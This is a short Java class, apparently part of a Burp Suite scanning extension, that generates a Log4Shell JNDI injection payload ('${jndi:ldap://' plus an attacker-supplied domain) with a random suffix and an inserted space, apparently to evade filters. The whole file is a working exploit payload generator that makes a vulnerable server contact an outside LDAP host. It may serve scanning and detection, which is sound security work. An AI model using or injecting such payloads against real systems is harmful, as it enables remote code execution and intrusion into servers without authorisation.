package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC3 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${jndi:ldap://" + domain + "/ " + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}"; //add a space
    }
}
